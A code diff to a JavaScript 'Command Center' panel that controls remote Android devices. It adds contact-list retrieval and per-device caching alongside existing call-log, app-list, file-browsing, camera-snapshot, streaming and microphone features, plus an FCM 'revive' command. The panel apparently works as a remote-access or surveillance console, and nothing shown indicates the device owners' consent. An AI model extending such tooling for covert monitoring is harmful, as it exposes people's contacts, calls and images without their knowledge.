@@ -1,4 +1,4 @@
-// Command Center Core Client Logic — Native WebSocket Edition (Multi-Device)
+// Command Center Core Client Logic — Native WebSocket Edition (Multi-Device + Contacts)
 
 // ─────────────────────────────────────────────────────────────
 // Signaling URL resolution
@@ -21,9 +21,6 @@ function getWebSocketURL() {
 
 // ─────────────────────────────────────────────────────────────
 // SignalingWebSocket — Drop-in replacement for Socket.IO client
-// NOTE: client-ready / client-disconnected events now deliver
-//       the FULL message object (not just the id) so we can
-//       forward model/name/deviceId from the server.
 // ─────────────────────────────────────────────────────────────
 
 class SignalingWebSocket {
@@ -142,7 +139,6 @@ class SignalingWebSocket {
         return;
       }
 
-      // Client ready / disconnect events: deliver the FULL message object.
       if (type === 'web-client-ready' || type === 'android-client-ready' ||
           type === 'web-client-disconnected' || type === 'android-client-disconnected') {
         this._dispatch(type, msg);
@@ -204,11 +200,19 @@ const socket = new SignalingWebSocket(getWebSocketURL());
 socket.connect();
 
 // ─────────────────────────────────────────────────────────────
-// Multi-Device State (NEW)
+// Multi-Device State
 // ─────────────────────────────────────────────────────────────
 
 const devices = new Map();          // wsId -> { id, model, name, deviceId, connectedAt }
 let selectedDeviceId = null;        // currently selected device wsId
+
+// ── Per-device caches (NEW) ──────────────────────────────────
+// These keep each device's data isolated, so switching back
+// shows the correct data immediately without re-fetching.
+const callLogsByDevice   = new Map();   // wsId -> [ {number, type, date, duration}, ... ]
+const contactsByDevice   = new Map();   // wsId -> [ {name, phones:[...]}, ... ]  (normalized)
+const appsByDevice       = new Map();   // wsId -> [ {name, package, version}, ... ]
+const deviceInfoByDevice = new Map();   // wsId -> { model, manufacturer, version, battery, ... }
 
 // ─────────────────────────────────────────────────────────────
 // DOM References
@@ -232,27 +236,42 @@ const infoManufacturer = document.getElementById('infoManufacturer');
 const infoVersion = document.getElementById('infoVersion');
 const infoBattery = document.getElementById('infoBattery');
 
+// Tab buttons
 const tabCalls = document.getElementById('tabCalls');
 const tabApps = document.getElementById('tabApps');
+const tabContacts = document.getElementById('tabContacts');
+
+// Tab panes
 const paneCalls = document.getElementById('paneCalls');
 const paneApps = document.getElementById('paneApps');
+const paneContacts = document.getElementById('paneContacts');
+
+// Panes content
 const callLogList = document.getElementById('callLogList');
 const appList = document.getElementById('appList');
+const contactList = document.getElementById('contactList');
 
+// Search / refresh inputs
+const appSearchInput = document.getElementById('appSearchInput');
+const btnRefreshApps = document.getElementById('btnRefreshApps');
+
+const contactSearchInput = document.getElementById('contactSearchInput');
+const btnRefreshContacts = document.getElementById('btnRefreshContacts');
+
+// Metrics
 const infoBatteryDetails = document.getElementById('infoBatteryDetails');
 const storageText = document.getElementById('storageText');
 const storageProgress = document.getElementById('storageProgress');
 const videoQualitySelect = document.getElementById('videoQualitySelect');
 
-const appSearchInput = document.getElementById('appSearchInput');
-const btnRefreshApps = document.getElementById('btnRefreshApps');
-
+// File explorer
 const fsPathInput = document.getElementById('fsPathInput');
 const fsBackBtn = document.getElementById('fsBackBtn');
 const fsGoBtn = document.getElementById('fsGoBtn');
 const fileListDiv = document.getElementById('fileList');
 const fsSortSelect = document.getElementById('fsSortSelect');
 
+// Snapshot
 const btnSnapFront = document.getElementById('btnSnapFront');
 const btnSnapBack = document.getElementById('btnSnapBack');
 const snapshotModal = document.getElementById('snapshotModal');
@@ -260,20 +279,23 @@ const snapshotPreview = document.getElementById('snapshotPreview');
 const btnDownloadSnapshot = document.getElementById('btnDownloadSnapshot');
 const btnCloseSnapshot = document.getElementById('btnCloseSnapshot');
 
+// Talkback
 const talkbackToggle = document.getElementById('talkbackToggle');
 
+// Upload
 const fsUploadArea = document.getElementById('fsUploadArea');
 const fsUploadInput = document.getElementById('fsUploadInput');
 const fsUploadLabel = document.getElementById('fsUploadLabel');
 const fsUploadProgress = document.getElementById('fsUploadProgress');
 
+// Preview
 const previewModal = document.getElementById('previewModal');
 const previewTitle = document.getElementById('previewTitle');
 const previewProgress = document.getElementById('previewProgress');
 const previewContent = document.getElementById('previewContent');
 const previewCloseBtn = document.getElementById('previewCloseBtn');
 
-// ── Device Selector DOM (NEW) ──
+// Device Selector
 const deviceSelector = document.getElementById('deviceSelector');
 const deviceCount = document.getElementById('deviceCount');
 
@@ -338,7 +360,7 @@ function reconnectSocket() {
 }
 
 // ─────────────────────────────────────────────────────────────
-// Device List Management (NEW)
+// Device List Management
 // ─────────────────────────────────────────────────────────────
 
 function getDeviceLabel(id) {
@@ -346,7 +368,6 @@ function getDeviceLabel(id) {
   if (!dev) return id;
   const name = dev.name || dev.model;
   if (name) return name;
-  // Fallback: last 6 chars of wsId
   return 'Device ' + id.substring(Math.max(0, id.length - 6));
 }
 
@@ -373,7 +394,6 @@ function renderDeviceList() {
 
   deviceCount.textContent = devices.size;
 
-  // Enable/disable stream buttons
   const hasSelection = !!selectedDeviceId && devices.has(selectedDeviceId);
   btnStartStream.disabled = !hasSelection;
   btnStopStream.disabled = !hasSelection;
@@ -387,7 +407,7 @@ function setVideoTagState(el, text, colorVar, bgVar, borderVar) {
   el.style.borderColor = borderVar;
 }
 
-function resetUIForNoDevice() {
+function resetMediaState() {
   if (peer) {
     try { peer.close(); } catch (e) {}
     peer = null;
@@ -411,19 +431,189 @@ function resetUIForNoDevice() {
 
   setVideoTagState(tagFront, 'IDLE', 'var(--danger)', 'rgba(239, 68, 68, 0.15)', 'var(--danger)');
   setVideoTagState(tagBack,  'IDLE', 'var(--danger)', 'rgba(239, 68, 68, 0.15)', 'var(--danger)');
+}
 
-  callLogList.innerHTML = '';
-  appList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
+function resetUIForNoDevice() {
+  resetMediaState();
+
+  callLogList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
+  appList.innerHTML     = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
+  contactList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No device selected.</div>';
   fileListDiv.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 40px; font-size: 0.85rem;">No device selected.</div>';
 
   infoModel.textContent = '—';
   infoManufacturer.textContent = '—';
   infoVersion.textContent = '—';
   infoBattery.textContent = '—';
+  infoBattery.style.color = '';
   infoBatteryDetails.textContent = '—';
   storageText.textContent = '0 GB / 0 GB';
   storageProgress.style.width = '0%';
 }
+
+// ─────────────────────────────────────────────────────────────
+// Per-device data rendering (NEW)
+// ─────────────────────────────────────────────────────────────
+
+function renderCallLogs(deviceId) {
+  const logs = callLogsByDevice.get(deviceId) || [];
+  callLogList.innerHTML = '';
+
+  if (logs.length === 0) {
+    callLogList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No call logs available.</div>';
+    return;
+  }
+
+  logs.forEach(call => {
+    const item = document.createElement('div');
+    item.className = 'data-item';
+    item.innerHTML = `
+      <div class="data-icon">📞</div>
+      <div class="data-details">
+        <div class="data-title">${escapeHtml(call.number)} (${escapeHtml(call.type)})</div>
+        <div class="data-desc">Duration: ${call.duration}s</div>
+      </div>
+      <div class="data-time">${escapeHtml(call.date)}</div>
+    `;
+    callLogList.appendChild(item);
+  });
+}
+
+function renderApps(deviceId) {
+  const apps = appsByDevice.get(deviceId) || [];
+  appList.innerHTML = '';
+
+  if (apps.length === 0) {
+    appList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No applications profiles synchronized yet. Click sync.</div>';
+    return;
+  }
+
+  apps.forEach(app => {
+    const item = document.createElement('div');
+    item.className = 'data-item';
+    item.innerHTML = `
+      <div class="data-icon">📱</div>
+      <div class="data-details">
+        <div class="data-title">${escapeHtml(app.name)}</div>
+        <div class="data-desc">${escapeHtml(app.package)} (v${escapeHtml(app.version)})</div>
+      </div>
+      <button class="btn-explorer btn-primary btn-launch-app" data-package="${escapeHtml(app.package)}" style="padding: 6px 12px; font-size: 0.75rem; box-shadow: none;">Launch</button>
+    `;
+    appList.appendChild(item);
+  });
+
+  appList.querySelectorAll('.btn-launch-app').forEach(btn => {
+    btn.addEventListener('click', (e) => {
+      if (!selectedDeviceId) return;
+      const pkg = e.target.getAttribute('data-package');
+      logDebug(`[CMD] Request launch for application: ${pkg}`);
+      socket.emit('cmd:launch_app', { to: selectedDeviceId, packageName: pkg });
+    });
+  });
+
+  // Re-apply current search filter
+  const q = appSearchInput.value.toLowerCase();
+  if (q) {
+    appList.querySelectorAll('.data-item').forEach(item => {
+      const text = item.textContent.toLowerCase();
+      item.style.display = text.includes(q) ? 'flex' : 'none';
+    });
+  }
+}
+
+function renderContacts(deviceId) {
+  const contacts = contactsByDevice.get(deviceId) || [];
+  contactList.innerHTML = '';
+
+  if (contacts.length === 0) {
+    contactList.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">No contacts synchronized yet. Click sync.</div>';
+    return;
+  }
+
+  contacts.forEach(contact => {
+    const item = document.createElement('div');
+    item.className = 'data-item';
+
+    const initial = (contact.name || '?').trim().charAt(0).toUpperCase() || '?';
+    const phonesHtml = contact.phones.length > 0
+      ? contact.phones.map(p => escapeHtml(p)).join(' • ')
+      : '—';
+
+    item.innerHTML = `
+      <div class="data-icon" style="font-weight: 700; font-size: 0.95rem;">${escapeHtml(initial)}</div>
+      <div class="data-details">
+        <div class="data-title">${escapeHtml(contact.name)}</div>
+        <div class="data-desc" style="font-family: var(--font-mono); font-size: 0.78rem;">${phonesHtml}</div>
+      </div>
+    `;
+    contactList.appendChild(item);
+  });
+
+  // Re-apply current search filter
+  const q = contactSearchInput.value.toLowerCase();
+  if (q) {
+    contactList.querySelectorAll('.data-item').forEach(item => {
+      const text = item.textContent.toLowerCase();
+      item.style.display = text.includes(q) ? 'flex' : 'none';
+    });
+  }
+}
+
+function renderDeviceInfo(deviceId) {
+  const info = deviceInfoByDevice.get(deviceId);
+  if (!info) {
+    infoModel.textContent = '—';
+    infoManufacturer.textContent = '—';
+    infoVersion.textContent = '—';
+    infoBattery.textContent = '—';
+    infoBattery.style.color = '';
+    infoBatteryDetails.textContent = '—';
+    storageText.textContent = '0 GB / 0 GB';
+    storageProgress.style.width = '0%';
+    return;
+  }
+
+  infoModel.textContent = info.model || '—';
+  infoManufacturer.textContent = info.manufacturer || '—';
+  infoVersion.textContent = info.version ? `Android ${info.version}` : '—';
+
+  if (info.battery !== undefined && info.battery !== null) {
+    infoBattery.textContent = `${info.battery}%`;
+    if (info.battery <= 15) infoBattery.style.color = 'var(--danger)';
+    else if (info.battery <= 35) infoBattery.style.color = 'var(--warning)';
+    else infoBattery.style.color = 'var(--success)';
+  } else {
+    infoBattery.textContent = '—';
+    infoBattery.style.color = '';
+  }
+
+  if (info.batteryTemp !== undefined && info.chargingSource) {
+    infoBatteryDetails.textContent = `${info.batteryTemp}°C • ${info.chargingSource}`;
+  } else {
+    infoBatteryDetails.textContent = '—';
+  }
+
+  if (info.storageTotal !== undefined && info.storageFree !== undefined) {
+    const occupied = (info.storageTotal - info.storageFree).toFixed(1);
+    storageText.textContent = `${occupied} GB / ${info.storageTotal} GB`;
+    const pct = ((occupied / info.storageTotal) * 100).toFixed(0);
+    storageProgress.style.width = `${pct}%`;
+  } else {
+    storageText.textContent = '0 GB / 0 GB';
+    storageProgress.style.width = '0%';
+  }
+}
+
+function renderCachedDataForDevice(deviceId) {
+  renderCallLogs(deviceId);
+  renderApps(deviceId);
+  renderContacts(deviceId);
+  renderDeviceInfo(deviceId);
+}
+
+// ─────────────────────────────────────────────────────────────
+// Device Selection
+// ─────────────────────────────────────────────────────────────
 
 function selectDevice(id) {
   if (!devices.has(id)) return;
@@ -439,8 +629,9 @@ function selectDevice(id) {
     } catch (e) {}
   }
 
-  // Reset all per-device UI / WebRTC state
-  resetUIForNoDevice();
+  // Reset media + per-device UI
+  resetMediaState();
+  clearFileExplorerUI();
 
   selectedDeviceId = id;
   renderDeviceList();
@@ -449,8 +640,17 @@ function selectDevice(id) {
   updateStatus(`Active device: ${label}`);
   logDebug(`[DEVICE] Selected: ${label} (${id})`);
 
-  // Fetch initial file list from the newly selected device
+  // Render cached data for this device (call logs, apps, contacts, metrics)
+  renderCachedDataForDevice(id);
+
+  // Fetch fresh file list
   requestFileList(currentPath);
+}
+
+function clearFileExplorerUI() {
+  currentFilesCache = [];
+  currentFilesPath = '';
+  fileListDiv.innerHTML = '<div style="color: var(--text-muted); text-align: center; margin-top: 40px; font-size: 0.85rem;">Loading directory...</div>';
 }
 
 deviceSelector.addEventListener('change', (e) => {
@@ -461,15 +661,12 @@ deviceSelector.addEventListener('change', (e) => {
 });
 
 // ─────────────────────────────────────────────────────────────
-// Stream Control Buttons (now target selectedDeviceId)
+// Stream Control Buttons
 // ─────────────────────────────────────────────────────────────
 
 if (btnStartStream) {
   btnStartStream.addEventListener('click', () => {
-    if (!selectedDeviceId) {
-      logDebug('[CMD] Cannot start — no device selected');
-      return;
-    }
+    if (!selectedDeviceId) return;
     logDebug(`[CMD] Sending start command to ${getDeviceLabel(selectedDeviceId)}`);
     socket.emit('cmd:start', { to: selectedDeviceId });
     updateStatus('Streaming start requested');
@@ -478,10 +675,7 @@ if (btnStartStream) {
 
 if (btnStopStream) {
   btnStopStream.addEventListener('click', () => {
-    if (!selectedDeviceId) {
-      logDebug('[CMD] Cannot stop — no device selected');
-      return;
-    }
+    if (!selectedDeviceId) return;
     logDebug(`[CMD] Sending stop command to ${getDeviceLabel(selectedDeviceId)}`);
     socket.emit('cmd:stop', { to: selectedDeviceId });
     updateStatus('Streaming stop requested');
@@ -490,20 +684,14 @@ if (btnStopStream) {
 
 if (btnRevive) {
   btnRevive.addEventListener('click', () => {
-    if (!selectedDeviceId) {
-      logDebug('[CMD] Cannot revive — no device selected');
-      return;
-    }
+    if (!selectedDeviceId) return;
     logDebug('[CMD] Sending FCM revive command');
     updateStatus('Revive command sent via FCM');
 
     fetch('/api/fcm/send', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        wsId: selectedDeviceId,
-        command: 'revive'
-      })
+      body: JSON.stringify({ wsId: selectedDeviceId, command: 'revive' })
     })
       .then(r => r.json())
       .then(data => {
@@ -519,18 +707,32 @@ if (btnRevive) {
 // ─────────────────────────────────────────────────────────────
 
 function switchTab(activeTab, activePane) {
-  [tabCalls, tabApps].forEach(t => t.classList.remove('active'));
-  [paneCalls, paneApps].forEach(p => p.style.display = 'none');
+  [tabCalls, tabApps, tabContacts].forEach(t => t.classList.remove('active'));
+  [paneCalls, paneApps, paneContacts].forEach(p => p.style.display = 'none');
 
   activeTab.classList.add('active');
-  activePane.style.display = activePane === paneApps ? 'flex' : 'block';
+  activePane.style.display = (activePane === paneApps || activePane === paneContacts) ? 'flex' : 'block';
 }
 
 tabCalls.addEventListener('click', () => switchTab(tabCalls, paneCalls));
+
 tabApps.addEventListener('click', () => {
   switchTab(tabApps, paneApps);
-  if (selectedDeviceId && appList.children.length <= 1) {
-    socket.emit('cmd:get_apps', { to: selectedDeviceId });
+  if (selectedDeviceId) {
+    const cache = appsByDevice.get(selectedDeviceId);
+    if (!cache || cache.length === 0) {
+      socket.emit('cmd:get_apps', { to: selectedDeviceId });
+    }
+  }
+});
+
+tabContacts.addEventListener('click', () => {
+  switchTab(tabContacts, paneContacts);
+  if (selectedDeviceId) {
+    const cache = contactsByDevice.get(selectedDeviceId);
+    if (!cache || cache.length === 0) {
+      socket.emit('cmd:get_contacts', { to: selectedDeviceId });
+    }
   }
 });
 
@@ -540,35 +742,31 @@ btnRefreshApps.addEventListener('click', () => {
   socket.emit('cmd:get_apps', { to: selectedDeviceId });
 });
 
+btnRefreshContacts.addEventListener('click', () => {
+  if (!selectedDeviceId) return;
+  logDebug('[CMD] Syncing contacts');
+  socket.emit('cmd:get_contacts', { to: selectedDeviceId });
+});
+
 appSearchInput.addEventListener('input', (e) => {
   const query = e.target.value.toLowerCase();
-  const appItems = appList.querySelectorAll('.data-item');
-  appItems.forEach(item => {
+  appList.querySelectorAll('.data-item').forEach(item => {
+    const text = item.textContent.toLowerCase();
+    item.style.display = text.includes(query) ? 'flex' : 'none';
+  });
+});
+
+contactSearchInput.addEventListener('input', (e) => {
+  const query = e.target.value.toLowerCase();
+  contactList.querySelectorAll('.data-item').forEach(item => {
     const text = item.textContent.toLowerCase();
     item.style.display = text.includes(query) ? 'flex' : 'none';
   });
 });
 
 // ─────────────────────────────────────────────────────────────
-// Telemetry Renderers
+// Utilities
 // ─────────────────────────────────────────────────────────────
-
-function addCallLog(call) {
-  const item = document.createElement('div');
-  item.className = 'data-item';
-  item.innerHTML = `
-    <div class="data-icon">📞</div>
-    <div class="data-details">
-      <div class="data-title">${escapeHtml(call.number)} (${escapeHtml(call.type)})</div>
-      <div class="data-desc">Duration: ${call.duration}s</div>
-    </div>
-    <div class="data-time">${escapeHtml(call.date)}</div>
-  `;
-  callLogList.prepend(item);
-  while (callLogList.children.length > 25) {
-    callLogList.removeChild(callLogList.lastChild);
-  }
-}
 
 function escapeHtml(str) {
   if (!str) return '';
@@ -643,7 +841,7 @@ talkbackToggle.addEventListener('click', async () => {
       talkbackToggle.style.color = '#10b981';
       talkbackToggle.style.borderColor = '#10b981';
       talkbackToggle.style.background = 'rgba(16, 185, 129, 0.1)';
-      logDebug('[TALKBACK] Microphone transmission active (broadcasting to device speaker)');
+      logDebug('[TALKBACK] Microphone transmission active');
     } catch (err) {
       logDebug('[TALKBACK] Microphone capture blocked: ' + err.message);
     }
@@ -1321,9 +1519,9 @@ socket.on('id', (id) => {
   logDebug(`Authenticated session ID: ${myId}`);
 });
 
-// ── Android client connected (may include model/name/deviceId) ──
+// ── Android client connected ──
 socket.on('android-client-ready', (msg) => {
-  const id = msg && msg.id ? msg.id : msg;  // tolerate old format
+  const id = msg && msg.id ? msg.id : msg;
   if (!id) return;
 
   devices.set(id, {
@@ -1339,7 +1537,6 @@ socket.on('android-client-ready', (msg) => {
   const wasEmpty = devices.size === 1;
   renderDeviceList();
 
-  // Auto-select first device when none is selected
   if (!selectedDeviceId || wasEmpty) {
     selectDevice(id);
   } else {
@@ -1353,13 +1550,19 @@ socket.on('android-client-disconnected', (msg) => {
   if (!id) return;
 
   const label = getDeviceLabel(id);
+
+  // Purge all caches for this device
   devices.delete(id);
+  callLogsByDevice.delete(id);
+  contactsByDevice.delete(id);
+  appsByDevice.delete(id);
+  deviceInfoByDevice.delete(id);
+
   renderDeviceList();
 
   logDebug(`[DEVICE] Offline: ${label} (${id})`);
 
   if (selectedDeviceId === id) {
-    // The selected device went away. Reset state.
     selectedDeviceId = null;
     resetUIForNoDevice();
 
@@ -1375,77 +1578,111 @@ socket.on('android-client-disconnected', (msg) => {
   }
 });
 
+// ── Device info (FILTERED + CACHED) ──
 socket.on('device_info', (info) => {
-  logDebug('Received telemetry profile');
-
-  if (info.model) infoModel.textContent = info.model;
-  if (info.manufacturer) infoManufacturer.textContent = info.manufacturer;
-  if (info.version) infoVersion.textContent = `Android ${info.version}`;
-
-  if (info.battery !== undefined) {
-    infoBattery.textContent = `${info.battery}%`;
-    if (info.battery <= 15) infoBattery.style.color = 'var(--danger)';
-    else if (info.battery <= 35) infoBattery.style.color = 'var(--warning)';
-    else infoBattery.style.color = 'var(--success)';
+  if (!info) return;
+  const from = info.from;
+  if (!from || from !== selectedDeviceId) {
+    // Ignore data from non-selected device
+    return;
   }
 
-  if (info.batteryTemp !== undefined && info.chargingSource) {
-    infoBatteryDetails.textContent = `${info.batteryTemp}°C • ${info.chargingSource}`;
-  }
+  deviceInfoByDevice.set(from, {
+    model: info.model,
+    manufacturer: info.manufacturer,
+    version: info.version,
+    battery: info.battery,
+    batteryTemp: info.batteryTemp,
+    chargingSource: info.chargingSource,
+    storageTotal: info.storageTotal,
+    storageFree: info.storageFree
+  });
 
-  if (info.storageTotal !== undefined && info.storageFree !== undefined) {
-    const occupied = (info.storageTotal - info.storageFree).toFixed(1);
-    storageText.textContent = `${occupied} GB / ${info.storageTotal} GB`;
-    const pct = ((occupied / info.storageTotal) * 100).toFixed(0);
-    storageProgress.style.width = `${pct}%`;
-  }
+  logDebug(`[TELEMETRY] Updated metrics from ${getDeviceLabel(from)}`);
+  renderDeviceInfo(from);
 });
 
+// ── Call logs (FILTERED + CACHED) ──
 socket.on('call_log', (data) => {
-  if (data && data.call_logs) {
-    callLogList.innerHTML = '';
-    data.call_logs.forEach(addCallLog);
-  }
+  if (!data || !data.call_logs) return;
+  const from = data.from;
+  if (!from || from !== selectedDeviceId) return;
+
+  callLogsByDevice.set(from, data.call_logs);
+  logDebug(`[CALLS] Received ${data.call_logs.length} logs from ${getDeviceLabel(from)}`);
+  renderCallLogs(from);
 });
 
+// ── Apps list (FILTERED + CACHED) ──
 socket.on('apps_list', (data) => {
-  logDebug('Apps list profiles updated');
-  if (data && data.apps) {
-    appList.innerHTML = '';
-    data.apps.forEach(app => {
-      const item = document.createElement('div');
-      item.className = 'data-item';
-      item.innerHTML = `
-        <div class="data-icon">📱</div>
-        <div class="data-details">
-          <div class="data-title">${escapeHtml(app.name)}</div>
-          <div class="data-desc">${escapeHtml(app.package)} (v${escapeHtml(app.version)})</div>
-        </div>
-        <button class="btn-explorer btn-primary btn-launch-app" data-package="${escapeHtml(app.package)}" style="padding: 6px 12px; font-size: 0.75rem; box-shadow: none;">Launch</button>
-      `;
-      appList.appendChild(item);
-    });
+  if (!data || !data.apps) return;
+  const from = data.from;
+  if (!from || from !== selectedDeviceId) return;
 
-    appList.querySelectorAll('.btn-launch-app').forEach(btn => {
-      btn.addEventListener('click', (e) => {
-        if (!selectedDeviceId) return;
-        const pkg = e.target.getAttribute('data-package');
-        logDebug(`[CMD] Request launch for application: ${pkg}`);
-        socket.emit('cmd:launch_app', { to: selectedDeviceId, packageName: pkg });
-      });
-    });
-  }
+  appsByDevice.set(from, data.apps);
+  logDebug(`[APPS] Received ${data.apps.length} apps from ${getDeviceLabel(from)}`);
+  renderApps(from);
 });
 
+// ── Contacts list (FILTERED + CACHED + NORMALIZED) ──
+// Android sends: { to, from, contacts_list: [{name, number}, ...] }
+// We normalize: group by name → { name, phones: [num1, num2, ...] }
+socket.on('contacts_list', (data) => {
+  if (!data) return;
+  const from = data.from;
+  if (!from || from !== selectedDeviceId) return;
+
+  // Tolerate both possible field names ("contacts_list" from Android, "contacts" from future)
+  const rawList = data.contacts_list || data.contacts || [];
+
+  const normalized = normalizeContacts(rawList);
+  contactsByDevice.set(from, normalized);
+
+  logDebug(`[CONTACTS] Received ${rawList.length} entries → ${normalized.length} unique contacts from ${getDeviceLabel(from)}`);
+  renderContacts(from);
+});
+
+function normalizeContacts(rawList) {
+  const byName = new Map();
+
+  for (const c of rawList) {
+    const name = ((c && c.name) || 'Unknown').toString().trim() || 'Unknown';
+
+    // Support both { name, number } (current Android) and { name, phones: [] } (future)
+    let numbers = [];
+    if (Array.isArray(c.phones)) {
+      numbers = c.phones.filter(Boolean).map(n => n.toString().trim());
+    } else if (c.number) {
+      numbers = [c.number.toString().trim()];
+    }
+
+    if (!byName.has(name)) {
+      byName.set(name, { name: name, phones: [] });
+    }
+    const entry = byName.get(name);
+    for (const num of numbers) {
+      if (num && !entry.phones.includes(num)) {
+        entry.phones.push(num);
+      }
+    }
+  }
+
+  return Array.from(byName.values()).sort((a, b) => a.name.localeCompare(b.name));
+}
+
+// ── Snapshot (FILTERED) ──
 socket.on('snapshot_data', (data) => {
-  if (data && data.snapshot) {
-    logDebug(`Received camera snapshot from: ${data.snapshot.camera}`);
-    currentSnapshotBase64 = data.snapshot.image;
-    snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
-    snapshotModal.classList.add('active');
-  }
+  if (!data || !data.snapshot) return;
+  const from = data.from;
+  if (!from || from !== selectedDeviceId) return;
+
+  logDebug(`Received camera snapshot from: ${data.snapshot.camera}`);
+  currentSnapshotBase64 = data.snapshot.image;
+  snapshotPreview.src = `data:image/jpeg;base64,${currentSnapshotBase64}`;
+  snapshotModal.classList.add('active');
 });
 
+// ── File system responses (already targeted via `to`, but we still verify) ──
 socket.on('fs:files', (data) => {
   logDebug('Refreshing explorer directory tree');
   if (data && data.file_list) {
@@ -1551,7 +1788,6 @@ socket.on('signal', async (data) => {
   if (!data) return;
   const { from, signal } = data;
 
-  // Ignore any signal from a device that isn't currently selected
   if (!selectedDeviceId || from !== selectedDeviceId) {
     logDebug(`[WEBRTC] Ignoring signal from non-selected device: ${from}`);
     return;
